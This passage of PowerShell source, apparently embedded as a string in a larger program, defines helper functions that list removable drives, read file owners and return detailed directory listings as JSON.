        Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
            $drives += [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Removable"
                SizeGB = if ($_.Size) { [math]::Round($_.Size / 1GB, 2) } else { 0 }
                FreeSpaceGB = if ($_.FreeSpace) { [math]::Round($_.FreeSpace / 1GB, 2) } else { 0 }
                PercentFree = if ($_.Size -gt 0) { [math]::Round(($_.FreeSpace / $_.Size) * 100, 2) } else { 0 }
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $drives -Compress
        return $jsonResult
    }
    catch {
        return "Error getting drive information: $_"
    }
}

function Get-FileOwner {
    <#
    .SYNOPSIS
        Gets the owner of a file or directory
    .DESCRIPTION
        Returns the owner of the specified file or directory
    .PARAMETER Path
        Path to the file or directory
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        $acl = Get-Acl -Path $Path -ErrorAction SilentlyContinue
        if ($acl) {
            return $acl.Owner
        } else {
            return "Unknown"
        }
    }
    catch {
        return "Unknown"
    }
}

function Get-FileSystemItems {
    <#
    .SYNOPSIS
        Gets file system items (files and folders) with detailed information
    .DESCRIPTION
        Provides a detailed listing of files and folders in the specified directory
    .PARAMETER Path
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        # Expand environment variables if present
        if ($Path -match '%\w+%') {
            $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
        }
        
        # Check if directory exists
        if (-not (Test-Path -Path $Path -PathType Container)) {
            return "Error: Directory not found: $Path"
        }
        
        # Get items with error handling
        $itemsInfo = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $type = if ($_.PSIsContainer) { "Directory" } else { "File" }
            $size = if ($_.PSIsContainer) { "N/A" } else { $_.Length }
            $extension = if ($_.PSIsContainer) { "" } else { $_.Extension }
            
            # Create object with properties
            [PSCustomObject]@{
                Name = $_.Name
                FullPath = $_.FullName
                Type = $type
                Size = $size
                Extension = $extension
                Created = $_.CreationTime
                Modified = $_.LastWriteTime
                Attributes = $_.Attributes.ToString()
                IsHidden = $_.Attributes -band [System.IO.FileAttributes]::Hidden
                IsSystem = $_.Attributes -band [System.IO.FileAttributes]::System
                IsReadOnly = $_.Attributes -band [System.IO.FileAttributes]::ReadOnly
                Owner = (Get-FileOwner -Path $_.FullName)
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $itemsInfo -Depth 3 -Compress
        return $jsonResult
    }
    catch {
        return "Error getting file system items: $_"
    }
}"""